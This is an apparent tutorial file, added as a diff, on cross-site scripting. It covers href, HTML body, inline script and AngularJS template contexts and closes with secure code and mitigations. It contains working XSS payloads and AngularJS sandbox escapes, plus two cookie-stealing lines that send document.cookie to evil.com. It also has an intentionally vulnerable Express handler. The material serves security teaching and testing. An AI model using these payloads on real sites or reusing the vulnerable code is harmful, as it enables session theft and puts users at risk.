@@ -1,0 +1,274 @@
+# Cross-Site Scripting (XSS): Link Tags, Image Vectors, Page Scripts, & AngularJS Sandbox Bypasses
+
+In web security, **Cross-Site Scripting (XSS)** consistently ranks among the most prevalent and critical vulnerabilities. It allows attackers to **execute arbitrary JavaScript in victim browsers** within the legitimate security origin of the vulnerable application.
+
+Beginners often fail by relying solely on the generic `<script>alert(1)</script>` payload, which gets blocked or fails when it does not match the output context.
+
+The cornerstone of mastering XSS is understanding that **Output Context (HTML Body, `href` Attribute, JavaScript Block, or AngularJS Template) dictates the exact injection vector required**.
+
+---
+
+## 1. Four Core XSS Contexts & Injection Vectors
+
+![XSS Vectors and AngularJS CSTI](/images/xss-vectors-angularjs.svg)
+
+---
+
+## 2. In-Depth Breakdown of 4 Core XSS Vectors
+
+Here is an analysis of each injection vector and its corresponding evasion techniques:
+
+---
+
+### Vector 1: Link Tags (`<a href="...">` & Pseudo-Protocol Scheme)
+
+This context occurs when user input is reflected inside the `href` attribute of an `<a>` tag, navigation buttons, or DOM sinks like `location.href`:
+
+```html
+<!-- Server renders user input directly into the href attribute -->
+<a href="USER_INPUT">Click Here to Proceed</a>
+```
+
+#### Why Does `<script>` Fail?
+If you supply `<script>alert(1)</script>`, the rendered HTML becomes:
+`<a href="<script>alert(1)</script>">`
+The browser interprets the input as a raw URL string, meaning **no script tag is parsed or executed**.
+
+#### The Attacker Solution (Pseudo-Protocol `javascript:` & Data URIs):
+Use the `javascript:` pseudo-protocol scheme, which executes JavaScript when the user clicks the link:
+
+```http
+javascript:alert(document.domain)
+javascript:fetch('https://evil.com/steal?c='+document.cookie)
+```
+
+#### Variations & Filter Bypasses in `href`:
+1. **Data URI Scheme:**
+   ```http
+   data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+   ```
+2. **Bypassing Protocol Validation (When server enforces `http://` or `https://` prefixes):**
+   ```http
+   javascript:alert(1)//https://trusted-site.com
+   ```
+   *(The `//https://...` acts as a JavaScript comment, fulfilling URL checks while preserving execution).*
+
+---
+
+### Vector 2: Image Tags (`<img src=x onerror=...>` & SVG Vectors)
+
+This context occurs when user input is rendered directly into the HTML body (`<div>USER_INPUT</div>` or `<p>USER_INPUT</p>`).
+
+#### Why Are `<img>` and `<svg>` Favored by Bug Hunters?
+Image and SVG vectors enable **0-Click Exploitation**—meaning JavaScript executes **automatically and instantly** as soon as the page loads, requiring zero user interaction!
+
+#### Execution Mechanism of `onerror`:
+```html
+<img src="x" onerror="alert(document.domain)" />
+```
+1. The browser attempts to load the image resource from path `x`.
+2. Because the resource path is invalid, the `onerror` event listener triggers immediately and executes the inline JavaScript!
+
+#### Popular Variations & Space-Free Obfuscation:
+1. **SVG Onload:**
+   ```html
+   <svg onload="alert(1)">
+   <svg/onload=alert(1)>
+   ```
+2. **SVG Animation (`onbegin`):**
+   ```html
+   <svg><animate onbegin="alert(1)" attributeName="x" dur="1s">
+   ```
+3. **Space-Free Payloads (Bypassing whitespace filters):**
+   ```html
+   <img/src=x/onerror=alert(1)>
+   <img/src=1/onerror=this.src='https://evil.com/log?c='+document.cookie>
+   ```
+
+---
+
+### Vector 3: Page Script Breakout (Injection Inside `<script>` Blocks)
+
+This context occurs when backend applications embed server-side variables directly into inline JavaScript:
+
+```html
+<script>
+  let searchQuery = 'USER_INPUT';
+  displayResults(searchQuery);
+</script>
+```
+
+Injecting `<script>alert(1)</script>` corrupts the JavaScript syntax because it lands inside a string literal.
+
+#### Technique 1: Closing the Script Tag (HTML Context Breakout)
+The HTML parser takes precedence over the JavaScript parser. Closing the script block terminates the existing block and initiates a fresh one:
+```html
+</script><script>alert(1)</script>
+```
+
+#### Technique 2: String Literal Termination (JavaScript Context Breakout)
+If closing `</script>` tags are filtered, terminate the string delimiter and chain executable code:
+* **Single-Quote Breakout:**
+  ```javascript
+  '-alert(document.cookie)-'
+  ';alert(1)//
+  ```
+  *Rendered output:* `let searchQuery = ''-alert(document.cookie)-'';`
+* **ES6 Template Literals (Inside backticks `` ` ``):**
+  ```javascript
+  ${alert(document.domain)}
+  ```
+
+---
+
+### Vector 4: AngularJS Client-Side Template Injection (CSTI & Sandbox Bypasses)
+
+Applications incorporating **AngularJS (1.x)** utilize a client-side template compilation engine.
+
+When an HTML element contains an `ng-app` directive (e.g. `<body ng-app>` or `<div ng-app>`):
+```html
+<body ng-app>
+  <h1>Search results for: USER_INPUT</h1>
+</body>
+```
+
+#### Why Do Server-Side HTML Sanitizers Fail?
+Even if the backend rigorously converts `<` to `&lt;` and `>` to `&gt;`, **the AngularJS client library parses and evaluates double curly brace expressions `{{...}}` automatically in the browser!**
+
+#### 1. Initial CSTI Verification:
+Submit: `{{7*7}}`
+* If the page displays **`49`**, Client-Side Template Injection is confirmed!
+
+#### 2. Why Doesn't `{{alert(1)}}` Execute Immediately?
+AngularJS includes an **Expression Sandbox** that restricts expressions inside `{{ }}` from directly referencing global objects like `window` or `document`.
+
+#### 3. Sandbox Escape Techniques (Function Constructor Execution):
+Attackers traverse JavaScript prototypes (`constructor.constructor`) to obtain the native global `Function()` constructor:
+
+* **Universal Function Constructor Escape:**
+  ```html
+  {{constructor.constructor('alert(document.domain)')()}}
+  ```
+* **Scope-Based Escapes (`$on` / `$eval`):**
+  ```html
+  {{$on.constructor('alert(1)')()}}
+  {{$eval.constructor('alert(1)')()}}
+  ```
+* **Array Prototype Escape (AngularJS 1.6+):**
+  ```html
+  {{[].pop.constructor('alert(1)')()}}
+  ```
+* **AngularJS Event Directives:**
+  ```html
+  <input ng-focus="$event.view.alert(1)" autofocus>
+  <div ng-init="a=constructor.constructor('alert(1)')()"></div>
+  ```
+
+---
+
+## 3. Systematic XSS Testing Workflow (Burp Suite & Browser)
+
+Follow this structured protocol to identify and exploit XSS:
+
+---
+
+### Step 1: Inject a Unique Canary String
+Submit a unique, trackable string containing special characters:
+```text
+testxss123'"<>
+```
+
+---
+
+### Step 2: Inspect the Output Context
+Locate `testxss123` via **Inspect Element** or in Burp Repeater responses:
+1. **Inside HTML Body (`<p>testxss123</p>`):** Deploy Vector 2 (`<img>` / `<svg>`).
+2. **Inside Link Attributes (`<a href="testxss123">`):** Deploy Vector 1 (`javascript:alert(1)`).
+3. **Inside Script Blocks (`var q = 'testxss123';`):** Deploy Vector 3 (`';alert(1)//` or `</script>`).
+4. **Inside Elements Governed by `ng-app`:** Deploy Vector 4 (`{{constructor.constructor('alert(1)')()}}`).
+
+---
+
+### Step 3: Deliver the Tailored Payload & Verify Execution
+1. Send the context-specific payload.
+2. Confirm execution when the `alert(document.domain)` pop-up triggers! 🎉
+
+---
+
+## 4. Backend Source Code: Vulnerable vs. Secure
+
+### ❌ Vulnerable Implementation (Naive Concatenation & Partial Sanitization)
+```typescript
+import express from "express";
+const app = express();
+
+app.get("/search", (req, res) => {
+  const query = req.query.q as string;
+
+  // ❌ VULNERABLE: Direct string interpolation across mixed contexts
+  const html = `
+    <body ng-app>
+      <h2>Search results for: ${query}</h2>
+      <a href="${query}">External link</a>
+      <script>
+        var lastSearch = '${query}';
+      </script>
+    </body>
+  `;
+
+  return res.send(html);
+});
+```
+
+---
+
+### ✅ Secure Implementation (Context-Aware Escaping & CSP)
+```typescript
+import express from "express";
+import DOMPurify from "dompurify";
+import { JSDOM } from "jsdom";
+
+const app = express();
+const window = new JSDOM("").window;
+const purify = DOMPurify(window);
+
+app.get("/search", (req, res) => {
+  const query = req.query.q as string;
+
+  // 1. Enforce strict Content Security Policy (CSP)
+  res.setHeader(
+    "Content-Security-Policy",
+    "default-src 'self'; script-src 'self'; object-src 'none';"
+  );
+
+  // 2. Sanitize HTML output with trusted library
+  const cleanQuery = purify.sanitize(query);
+
+  // 3. Disable template binding on user-controlled inputs with ng-non-bindable
+  const html = `
+    <body ng-app>
+      <h2 ng-non-bindable>${escapeHtml(cleanQuery)}</h2>
+    </body>
+  `;
+
+  return res.send(html);
+});
+
+function escapeHtml(text: string): string {
+  return text
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;")
+    .replace(/'/g, "&#039;");
+}
+```
+
+---
+
+## 5. Comprehensive Defense-in-Depth Mitigation
+
+1. **Context-Aware Output Encoding:** Escape data specifically according to its output sink (HTML Entity, Attribute, JavaScript, URL).
+2. **Deploy Strict Content Security Policy (CSP):** Use `Content-Security-Policy: default-src 'self'; script-src 'self'` to block inline scripts and `javascript:` schemes.
+3. **Apply `ng-non-bindable` on AngularJS Pages:** Invalidate template expression compilation on user-controlled DOM nodes.
+4. **Set `HttpOnly` on Session Cookies:** Protect sensitive authentication tokens against theft in the event of an XSS vulnerability.
